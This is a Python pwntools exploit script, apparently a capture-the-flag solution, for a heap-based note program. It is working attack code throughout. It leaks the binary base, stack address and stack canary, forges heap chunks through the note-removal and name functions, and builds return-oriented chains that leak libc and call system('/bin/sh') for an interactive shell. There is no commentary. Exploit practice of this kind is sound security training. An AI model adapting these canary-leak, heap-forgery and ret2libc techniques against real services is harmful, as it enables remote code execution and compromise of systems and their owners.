#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('prob_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("172.17.0.2", 1234)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "./prob"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x17C5
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def make_note(num, size, data):
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b">>", str(num).encode())
    io.sendlineafter(b">>", str(size).encode())
    io.sendafter(b">>", data)

def make_note_clear(num, size):
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b">>", str(num).encode())
    io.sendlineafter(b">>", str(size).encode())

def copy_note(src, dst):
    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b">>", str(src).encode())
    io.sendlineafter(b">>", str(dst).encode())

def remove_note(num):
    io.sendlineafter(b">>", b"3")
    io.sendlineafter(b">>", str(num).encode())

def change_name(name):
    io.sendlineafter(b">>", b"4")
    io.sendafter(b">>", name)


def solve():

    io.sendafter(b"?", b"A"*0x18)
    io.recvuntil(b"A"*0x18)
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    exe.address = leak - 0x1180
    info("elf base: %#x", exe.address)

    change_name(b"A"*0x20)
    io.recvuntil(b"A"*0x20)
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    stack = leak - 0x138
    info("stack: %#x", stack)

    make_note(0, 0x20, b"A"*8)
    make_note(1, 0x20, p32(0x11111111) * 2 + p64(stack+0x48))
    make_note(2, 0x20, b"C"*8)
    
    remove_note(0)
    remove_note(2)

    buf = stack + 0x18
    chunk_t = p64(0x0) + p64(0x80)

    change_name(chunk_t)
    make_note(3, 0x18, p32(5) + p32(0x18) + p64(buf+0x10))
    remove_note(5)

    make_note(1337, 0x70, b"A"*0x19)
    change_name(b"A"*0x20)
    io.recvuntil(b"A"*0x29)
    canary = u64(io.recv(7).rjust(8, b"\x00"))
    info("canary: %#x", canary)

    change_name(chunk_t)
    remove_note(1337)

    offset = 0x18
    pop_rdi = exe.address + 0x1833 # pop rdi; ret; 
    chain = flat({
        offset: [
            canary,
            b"A"*8,
            pop_rdi,
            exe.got["puts"],
            exe.plt["puts"],
            exe.sym["main"]
        ]
    })

    make_note(1337, 0x70, chain)
    io.sendlineafter(b">>", b"5")
    leak = io.recvline()[1:].strip(b"\n")
    puts = u64(leak.ljust(8, b"\x00"))
    libc.address = puts - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    io.sendafter(b"?", chunk_t)
    copy_note(1, 3)
    remove_note(0x11111111)

    chain = flat({
        offset: [
            canary,
            b"A"*8,
            pop_rdi,
            next(libc.search(b"/bin/sh\x00")),
            pop_rdi+1,
            libc.sym["system"]
        ]
    })

    make_note(1337, 0x70, chain)
    io.sendlineafter(b">>", b"5")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

